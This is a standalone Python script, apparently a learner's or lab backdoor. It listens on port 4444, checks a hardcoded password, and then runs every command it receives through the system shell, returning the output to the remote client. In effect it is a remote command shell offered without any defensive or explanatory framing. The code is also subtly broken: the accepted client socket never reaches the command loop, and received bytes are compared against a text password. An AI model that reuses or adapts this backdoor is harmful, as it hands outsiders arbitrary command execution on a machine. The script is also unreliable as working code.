import socket
import subprocess

HOST = '10.0.2.15'
PORT = 4444
PASSWORD = "iloveboosters"
client = None
client_addr = None

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

def login():
    print('Server running, listening for connection')
    server.listen(1)

    client, client_addr = server.accept()
    print('Connection established from', client_addr)

    try:
        password = client.recv(1024).strip()
        print('Client input:', password)

        if password == PASSWORD:
            print('Login successful')
            return True
        else:
            print('Login failed')
            client.close()
            return False

    except Exception as e:
        print('Login exception:', e)
        client.close()
        return False

login_status = False
while not login_status:
    login_status = login()

while True:
    try:
        print('Waiting for client command')
        client_cmd = client.recv(1024).strip()

        if not client_cmd:
            raise Exception("Client disconnected")

        if client_cmd.lower() == 'exit':
            client.close()
            break

        # process command as if client was typing into shell locally - ISSUE
        op = subprocess.Popen(client_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = op.communicate()
        result = output + error

        client.send(result)

    except Exception as e:
        print('Client cmd exception:', e)

        # Auto log out
        login_status = False
        while not login_status:
            login_status = login()

server.close()
print('Connection Closed')
